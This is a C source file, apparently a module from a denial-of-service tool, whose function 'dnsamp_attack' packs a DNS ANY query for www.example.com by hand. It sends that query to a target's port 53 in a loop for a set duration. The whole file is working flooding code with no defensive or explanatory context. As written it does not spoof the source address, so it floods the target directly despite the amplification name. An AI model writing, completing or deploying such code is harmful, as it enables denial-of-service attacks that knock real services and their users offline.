#define _GNU_SOURCE

#include "headers/dnsamp_attack.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <linux/ip.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>

void* dnsamp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (dns_sock < 0) {
        return NULL;
    }

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = params->target_addr.sin_addr.s_addr;

    unsigned char dns_query[512];
    memset(dns_query, 0, sizeof(dns_query));
    
    dns_query[0] = (rand() >> 8) & 0xFF;
    dns_query[1] = rand() & 0xFF;
    dns_query[2] = 0x00;
    dns_query[3] = 0x00;
    dns_query[4] = 0x00;
    dns_query[5] = 0x01;
    dns_query[6] = 0x00;
    dns_query[7] = 0x00;
    dns_query[8] = 0x00;
    dns_query[9] = 0x00;
    dns_query[10] = 0x00;
    dns_query[11] = 0x00;
    dns_query[12] = 0x03;
    dns_query[13] = 'w';
    dns_query[14] = 'w';
    dns_query[15] = 'w';
    dns_query[16] = 0x07;
    dns_query[17] = 'e';
    dns_query[18] = 'x';
    dns_query[19] = 'a';
    dns_query[20] = 'm';
    dns_query[21] = 'p';
    dns_query[22] = 'l';
    dns_query[23] = 'e';
    dns_query[24] = 0x03;
    dns_query[25] = 'c';
    dns_query[26] = 'o';
    dns_query[27] = 'm';
    dns_query[28] = 0x00;
    dns_query[29] = 0x00;
    dns_query[30] = 0xFF;
    dns_query[31] = 0x00;
    dns_query[32] = 0x01;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        ssize_t sent = sendto(dns_sock, dns_query, 33, MSG_NOSIGNAL,
                            (struct sockaddr*)&dest, sizeof(dest));
        if (sent < 0) break;
    }

    close(dns_sock);
    return NULL;
}
